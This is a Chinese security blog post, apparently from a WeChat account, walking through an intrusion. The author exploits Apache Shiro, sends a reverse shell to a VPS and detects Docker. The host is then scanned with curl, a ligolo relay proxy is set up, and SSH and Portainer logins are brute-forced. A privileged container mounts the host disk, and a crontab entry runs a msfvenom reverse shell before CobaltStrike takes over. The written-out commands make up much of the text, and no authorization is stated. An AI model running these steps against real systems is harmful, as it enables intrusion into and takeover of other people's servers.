\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/fFwDGcixARBJmIrO5qxTkA)

![](https://mmbiz.qpic.cn/mmbiz_png/0fwWib0uAxkLXkkeCw3wrNGUOUicDRle5OQftoX4ib03wNZAXNtAMaLicJ7rNQQV5R5ZvJ97cBS9OY8vEhlEwhyqPg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

Shiro漏洞利用

![](https://mmbiz.qpic.cn/mmbiz_png/3n7VQRz6w55cupvOM5odibMKicQP1zYeBKTWiadBWTEN0Tx4WWF8Mbp4x7e9BydyiacWPDFWibibafwz4RyCclFje8YA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

该网站页面存在Remember me，大概率是shiro  

-------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTz43T0AQLz0DGBdghobIJibhKWRHv5FpxKHF3BOaMaMxk9xLyjVmicKB0A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

由于这个环境并不稳定，请求多了就卡住（自带防御属性啊～）

https://github.com/tangxiaofeng7/Shiroexploit

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzvgsEQ8dPPPovg62524FuqaqibNxgLhpOHkTRxniaEkObQfqOH9yre1wA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1) 

判断可以出网后把shell反弹到vps上：

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icGLdtG7uwH9T2iaSd6foYTzmxILKibt0ZjKrRpRp5yFUx3icrSuSZhJAWgBeMVpT7ibdnibSgcsTGLibiaw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

---

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Docker检测与逃逸

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

---

然后查看一些信息的时候发现命令找不到：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

执行命令验证是否为docker环境：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

确实为docker环境，那么就看看宿主机有没有什么漏洞可以利用，使用 cat /etc/hosts,看到了主机IP为 192.168.16.2：  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

到这里本来想代理流量本地开工具扫扫的，想想还是试试其他的方法来玩玩，那么这里先循环ping一下C段检测存活IP，在这里找到了一个脚本(https://blog.csdn.net/qq\_38228830/article/details/81356984)，把工具下载到docker里：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

探测IP:

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现个192.168.16.1，那这个肯定是宿主机了，接下来，探测下宿主机的端口啊~~，这里嘛就用curl来探测端口：

```
`curl http://192.168.16.1:[1-100] 1> 1.txt 2>/dev/null``curl http://192.168.16.1:[8000-9999] 1>> 1.txt 2>/dev/null`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

命令执行完了查看文件发现两个端口开着服务，一个是SSH：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

一个是9000端口的Portainer面板：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

那么思路来了，要么爆破进行SSH，要么爆破进Portainer，接下来可以上代理了，继续用wget下载到docker里：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Docker上执行:

```
chmod +x ligolo_linux_amd64 && ligolo_linux_amd64 -autorestart -relayserver 122.*.*.*:88
```

VPS上执行:

```
localrelay_windows_amd64.exe -localserver 0.0.0.0:103 -relayserver=0.0.0.0:88
```

 88端口用于docker和vps通信，103端口用于开放socks代理。接下来用Proxifier设置代理了，先看看Portainer能不能访问：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

链接SSH:

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

开始爆破！！！

成功爆破后，这里就登录Portainer进行Docker逃逸了：

_注：Portainer__是一个可视化的容器镜像的图形管理工具，利用Portainer__可以轻松构建，管理和维护Docker__环境。_ _而且完全免费，基于容器化的安装方式，方便高效部署。Portainer__通过Docker.sock__与宿主机进行通信，这是它的正常功能：_

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在freebuf看到是这么介绍的：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

接下来开始逃逸，但是这里，我们进行链接的时候发现：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

啊这，那就只能使用这个方法了：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

好了，真的开始了逃逸了，先创建个容器：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里给他选择个特权模式：  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

1.然后链接这个容器的shell：fdisk -l

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2.此时查看/dev/路径会发现很多设备文件：ls /dev

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

3.新建目录以备挂载：mkdir /abcd

4.将/dev/sda1挂载至 /abcd: mount /dev/sda1 /abcd

5.最终我们可以通过访问容器内部的/abcd路径来达到访问整个宿主机的目的：ls /abcd:

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

6.接下来可以直接操作宿主的文件了！！！

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

7.直接写计划任务拿shell

先使用msfvenom生成一个python反弹shell的命令：

‍‍‍‍‍‍

```
msfvenom -p python/shell_reverse_tcp LHOST=ip LPORT=520 -f raw(这里生成的是基于py2的)
```

然后在docker里执行：  

```
echo  "* *     * * *   root   python –c \" [msfvenom生成的代码]\"" >> /abcd/etc/crontab
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==) 

可以看到反弹了shell回来，那么是不是这个宿主机Ubuntu呢？那肯定是，随便执行点命令看看：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

好了，已经逃逸到Ubuntu了，接下来让它上线到CobaltStrike，使用CrossC2插件（https://github.com/gloxec/CrossC2）：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

上线了：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

总结

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

       本文记录一次通过公网拿到docker容器权限，通过扫描发现宿主机地址，并对宿主机进行攻击，最后利用**_Portainer进行docker逃逸获得宿主机Ubuntu权限。_**  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**推荐阅读：**  

[**Docker渗透思路调研**](http://mp.weixin.qq.com/s?__biz=Mzg3NzE5OTA5NQ==&mid=2247484073&idx=1&sn=24f4e481dea7bfe873db4c3db4d20b5a&chksm=cf27e931f85060278f1efe7d155900709b5061f2d5cfc228f1ab945ea412f383a6bdbd17993b&scene=21#wechat_redirect)

  

[![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247490909&idx=1&sn=efdbd98bd302159324cb431f3d735165&chksm=ec1f4862db68c174c21d98f46847bba21a19602c4823ec17fb7363662751c385817e85d9c6ce&scene=21#wechat_redirect)

  

**点赞，转发，在看**

来源：雷石安全实验室

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)